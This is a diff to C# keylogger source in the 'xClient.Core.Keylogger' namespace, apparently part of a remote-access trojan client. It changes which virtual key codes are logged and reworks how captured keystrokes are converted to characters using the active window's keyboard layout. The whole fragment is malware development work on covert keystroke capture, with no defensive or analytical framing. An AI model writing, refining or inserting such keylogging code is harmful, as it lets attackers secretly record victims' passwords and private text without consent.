@@ -97,8 +97,8 @@ namespace xClient.Core.Keylogger
                 _enumValues.Add(i);
             }
 
-            for (int i = 65; i <= 122; i++)
-                //65-90 are the key codes for A-Z, skip 91-94 which are LWin + RWin keys, Applications and sleep key, 95-111 numpad keys, 112-122 are F1-F11 keys
+            for (int i = 65; i <= 111; i++)
+                //65-90 are the key codes for A-Z, skip 91-94 which are LWin + RWin keys, Applications and sleep key, 95-111 numpad keys
             {
                 if (i >= 91 && i <= 94)
                     continue;
@@ -129,8 +129,6 @@ namespace xClient.Core.Keylogger
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
             _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
-
-            _activeKeyboardLayout = GetActiveKeyboardLayout(); //Get active thread keyboard layout
 
             foreach (int i in _enumValues) //Loop through our enumValues list populated with the keys we want to log
             {
@@ -259,7 +257,7 @@ namespace xClient.Core.Keylogger
 
             var sb = new StringBuilder(10);
 
-            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, _activeKeyboardLayout) == 1
+            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
                 ? (char?) sb[0]
                 : null;
                 //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
